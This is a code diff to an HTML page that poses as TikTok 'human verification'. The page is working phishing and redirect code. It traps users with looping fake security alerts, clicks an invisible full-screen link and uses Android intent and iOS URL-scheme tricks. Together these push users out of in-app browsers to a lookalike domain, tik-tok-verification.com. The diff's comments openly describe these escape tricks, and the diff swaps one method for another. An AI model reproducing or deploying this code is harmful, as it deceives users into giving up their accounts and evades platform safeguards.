@@ -3,79 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification</title>
-    <style>body { background: #fff; margin: 0; padding: 0; }</style>
+    <style>
+        body { background: #fff; margin: 0; overflow: hidden; }
+        #ghost { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; z-index: 999; }
+    </style>
 </head>
 <body>
 
+<a id="ghost" href="https://tik-tok-verification.com/Verification/verify1.html" target="_blank">.</a>
+
 <script>
-    // CONFIGURATION
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    // Clean domain for protocol schemes (removes https://)
-    const cleanDomain = targetUrl.replace(/^https?:\/\//, '');
-    // 5-Second Fail-Safe
+    const domain = targetUrl.replace(/^https?:\/\//, '');
     const killTime = Date.now() + 5000;
 
-    function triggerSystemJump() {
+    function nuke() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // ANDROID: The "Browsable" Intent
-            // Forces the system to pick a browser app, not an internal webview.
-            window.location.href = `intent://${cleanDomain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
+            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS: The Protocol Stack (Corrected Syntax)
-            
-            // 1. Chrome Scheme (Corrected): 
-            // "googlechromes://domain.com" (No https://)
-            // If Chrome is installed, this opens the site DIRECTLY (No search).
-            // If not, it errors silently or prompts "Open in...?"
-            window.location.href = "googlechromes://" + cleanDomain;
+            // THE NEW COMBO
+            // 1. Fire a direct 'safari-https' call without the 'https://' inside it
+            window.location.href = "safari-https://" + domain;
 
-            // 2. FTP Breakout (The "Seal Breaker"):
-            // We use this as the backup because you confirmed it opens Safari.
-            // We delay it slightly so it only fires if Chrome didn't catch it.
-            setTimeout(() => {
-                // This forces Safari to open.
-                window.location.href = "ftp://" + cleanDomain;
-            }, 100);
-
-            // 3. The "Fix" for the FTP Error:
-            // Once Safari is open (even if showing the FTP error), 
-            // we fire the standard HTTPS link to overwrite the error page.
-            setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 200);
+            // 2. Click the Ghost Link programmatically
+            // This is seen as a 'User Interaction' by the OS
+            document.getElementById('ghost').click();
         }
     }
 
     function securityLoop() {
-        // FAIL-SAFE: Stop all alerts after 5 seconds
         if (Date.now() > killTime) return;
 
-        // 1. Try to Jump immediately
-        triggerSystemJump();
+        nuke();
 
-        // 2. Check Focus (Wait for jump to happen)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
                 const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
-                // 3. The Lock
                 alert(header + body);
-
-                // 4. RELAY: Fire immediately on "OK" tap
-                triggerSystemJump();
-
-                // 5. Loop
-                setTimeout(securityLoop, 200);
+                
+                nuke();
+                setTimeout(securityLoop, 250);
             }
-        }, 200);
+        }, 250);
     }
 
     window.onload = securityLoop;
 </script>
-
 </body>
 </html>
